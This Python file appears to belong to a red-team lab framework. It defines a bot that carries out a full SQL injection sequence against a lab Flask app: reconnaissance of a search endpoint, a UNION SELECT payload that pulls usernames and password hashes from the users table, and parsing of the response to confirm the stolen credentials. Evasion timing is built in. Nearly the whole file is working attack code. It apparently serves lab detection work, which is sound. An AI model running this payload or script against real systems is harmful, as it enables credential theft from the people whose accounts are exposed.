"""Objective bot: CWE-89 SQL Injection -> credential theft.

Real kill chain against the lab Flask target (docker/target/webapp/app.py):
  recon        -> GET /search?q= (discover the public search feature; the
                   response shape is 2 text columns: title, body)
  exploit      -> GET /search?q=' UNION SELECT username, password_hash
                   FROM users -- ; the target builds SQL with a raw
                   f-string against sqlite3, so the UNION rides through
                   the same 2-column shape as the posts table
  post_exploit -> independently parse the rendered `<li><b>..</b>: ..</li>`
                   rows and verify at least one looks like a real
                   werkzeug password hash (scrypt:... or pbkdf2:...),
                   rather than trusting the 200

CLASS_ID/MITRE_TACTIC feed `configs/lab_objectives.yaml` and the live
orchestrator's ground-truth event log.
"""

from __future__ import annotations

import re
import time

import requests

from src.adversarial.bots.lab_objective_base import (
    STAGE_EXPLOIT,
    STAGE_POST_EXPLOIT,
    STAGE_RECON,
    EventLogger,
    ObjectiveEvent,
    evasion_think_time,
    run_via_default_shim,
)
from src.adversarial.lab_clock import LabClock

CLASS_ID = "T1555_sqli_cred_theft"
MITRE_TACTIC = "Credential Access"

_ROW_RE = re.compile(r"<li><b>(.*?)</b>: (.*?)</li>")
_HASH_RE = re.compile(r"^(scrypt|pbkdf2):")
_UNION_PAYLOAD = "' UNION SELECT username, password_hash FROM users -- "


def run_objective(
    target_ip: str,
    evasion: str,
    clock: LabClock,
    event_log: EventLogger,
    round_id: str = "",
    base_url: str | None = None,
) -> dict:
    base = base_url or f"http://{target_ip}"
    session = requests.Session()
    result: dict = {"class_id": CLASS_ID, "success": False}

    def log(stage: str, success: bool, evidence: str = "") -> None:
        event_log.log(ObjectiveEvent(CLASS_ID, stage, success, time.time(), evidence, round_id))

    # --- recon: discover the public search feature ---------------------
    try:
        r = session.get(f"{base}/search", params={"q": ""}, timeout=5)
        recon_ok = r.status_code == 200 and "search" in r.text.lower()
    except requests.RequestException as exc:
        log(STAGE_RECON, False, str(exc))
        return result
    log(STAGE_RECON, recon_ok, f"status={r.status_code}")
    evasion_think_time(evasion, clock)

    # --- exploit: UNION-based SQL injection -----------------------------
    try:
        r = session.get(f"{base}/search", params={"q": _UNION_PAYLOAD}, timeout=5)
        exploit_ok = r.status_code == 200
    except requests.RequestException as exc:
        log(STAGE_EXPLOIT, False, str(exc))
        return result
    log(STAGE_EXPLOIT, exploit_ok, f"status={r.status_code}")

    # --- post-exploit: parse rows, verify real password hashes leaked ---
    evasion_think_time(evasion, clock)
    rows = _ROW_RE.findall(r.text)
    creds = [(u, h) for u, h in rows if _HASH_RE.match(h)]
    success = len(creds) > 0
    log(STAGE_POST_EXPLOIT, success, f"count={len(creds)}")
    result["success"] = success
    if success:
        result["stolen_usernames"] = [u for u, _ in creds]
    return result


def run(target_ip: str, evasion: str) -> int:
    """Legacy `RunFn -> int` shim for ad-hoc CLI use via attack_script.py."""
    return run_via_default_shim(run_objective, target_ip, evasion)
